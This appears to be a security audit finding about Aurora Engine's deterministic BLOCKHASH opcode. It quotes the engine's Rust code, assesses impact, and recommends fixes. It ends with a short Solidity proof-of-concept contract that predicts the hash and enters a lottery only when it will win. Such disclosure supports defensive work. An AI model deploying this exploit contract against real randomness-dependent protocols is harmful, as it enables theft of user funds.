### Title
Fully Deterministic `BLOCKHASH` Opcode Enables On-Chain Outcome Simulation and Fund Theft — (File: `engine/src/engine.rs`)

---

### Summary

Aurora Engine implements the EVM `BLOCKHASH` opcode by computing a SHA-256 hash over exclusively public, static constants: a fixed prefix byte, the chain ID, the engine account ID, and the block height. Every input is known before a block is produced. Any EVM contract executing on Aurora can therefore pre-compute the exact value that `blockhash(N)` will return for any block N, making it a zero-entropy source of "randomness." An attacker contract can read the deterministic hash, simulate the outcome of any randomness-dependent protocol, and revert if the result is unfavorable — guaranteeing only favorable executions land on-chain.

---

### Finding Description

The `BLOCKHASH` opcode is served by `compute_block_hash` in `engine/src/engine.rs`:

```rust
// engine/src/engine.rs  lines 1239–1251
pub fn compute_block_hash(chain_id: [u8; 32], block_height: u64, account_id: &[u8]) -> H256 {
    let mut data = Vec::with_capacity(...);
    data.push(BLOCK_HASH_PREFIX);          // constant: 0u8
    data.extend_from_slice(&chain_id);     // constant: mainnet = 1313161554
    data.extend_from_slice(account_id);    // constant: b"aurora"
    data.extend_from_slice(&block_height.to_be_bytes()); // public: current block number
    sdk::sha256(&data)
}
``` [1](#0-0) 

This function is called directly from the `Backend::block_hash` implementation that the EVM invokes for every `BLOCKHASH` opcode:

```rust
// engine/src/engine.rs  lines 1805–1817
fn block_hash(&self, number: U256) -> H256 {
    let idx = U256::from(self.env.block_height());
    if idx.saturating_sub(U256::from(256)) <= number && number < idx {
        compute_block_hash(
            self.state.chain_id,
            number.low_u64(),
            self.current_account_id.as_bytes(),
        )
    } else {
        H256::zero()
    }
}
``` [2](#0-1) 

All four inputs to `compute_block_hash` are either compile-time constants (`BLOCK_HASH_PREFIX = 0`, `chain_id`, `account_id = "aurora"`) or a publicly observable integer (`block_height`). None of them carry any entropy. The hash is therefore computable by any EVM contract before the transaction is submitted, and even before the block is produced.

This is structurally identical to the external report's root cause: the external report's randomness mixed `block.timestamp` (observable) with user-supplied `salt` and `penguinId` (controlled). Aurora's `BLOCKHASH` is strictly worse — it contains zero user-controlled or validator-contributed entropy at all.

Additionally, the `RandomSeed` precompile (`engine-precompiles/src/random.rs`) explicitly documents that it "will return the same seed if called multiple times in the same block": [3](#0-2) 

Its gas cost is set to `EthGas::new(0)`, meaning an attacker can query it for free within the same transaction: [4](#0-3)

### Impact Explanation

**Critical — Direct theft of user funds.**

Any EVM protocol deployed on Aurora that uses `blockhash()` as a randomness source (lotteries, NFT mints, random reward distributions, liquidation tie-breaking, etc.) is fully exploitable. An attacker contract can:

1. Compute `sha256(0x00 || chain_id || b"aurora" || block_height)` inline — no oracle, no off-chain component needed.
2. Feed that value into the same randomness formula the victim contract uses.
3. Revert if the simulated outcome is unfavorable; proceed only when it guarantees the maximum reward, avoids a penalty, or wins a lottery.

Because the revert path costs nothing beyond gas (and failed NEAR transactions are not charged on Aurora), the attacker can retry across blocks at negligible cost until a favorable block height is found. Funds held by any randomness-dependent contract on Aurora are directly at risk.

---

### Likelihood Explanation

**High.** Using `blockhash(block.number - 1)` as a cheap randomness seed is one of the most common patterns in Solidity contracts ported from Ethereum. Developers migrating contracts to Aurora have no reason to expect that `blockhash()` is even weaker than on Ethereum mainnet (where it at least incorporates validator-contributed entropy). The attack requires only a deployed contract and knowledge of the formula — both trivially available from the public source code.

---

### Recommendation

1. **Document prominently** that `blockhash()` on Aurora carries zero entropy and must never be used as a randomness source.
2. **Direct developers** to `block.prevrandao` (which maps to `env.random_seed()`, sourced from NEAR's per-block VRF output) or the `RandomSeed` precompile at `0xc104f4840573bed437190daf5d2898c2bdf928ac` as the correct entropy source.
3. **Consider replacing** the `compute_block_hash` formula with one that incorporates the NEAR block's `random_seed` so that `blockhash()` carries real entropy, matching developer expectations from Ethereum.

### Proof of Concept

```solidity
// Attacker contract deployed on Aurora
contract BlockhashExploit {
    // Replicates compute_block_hash from engine/src/engine.rs
    function predictedBlockhash(uint64 height) public pure returns (bytes32) {
        return sha256(abi.encodePacked(
            uint8(0),                          // BLOCK_HASH_PREFIX
            bytes32(uint256(1313161554)),       // chain_id (mainnet)
            bytes("aurora"),                   // account_id
            height                             // block_height
        ));
    }

    function attack(ILottery lottery) external {
        bytes32 hash = predictedBlockhash(uint64(block.number - 1));
        uint256 outcome = uint256(hash) % 100;
        // Only call the lottery when we know we win
        require(outcome < lottery.winThreshold(), "unfavorable block");
        lottery.enter{value: 1 ether}();
    }
}
```

The attacker calls `attack()` in a loop across blocks. Because `predictedBlockhash` is a pure function of public constants, the `require` check is always accurate. The attacker pays gas only for winning blocks; all other attempts revert before touching the victim contract.
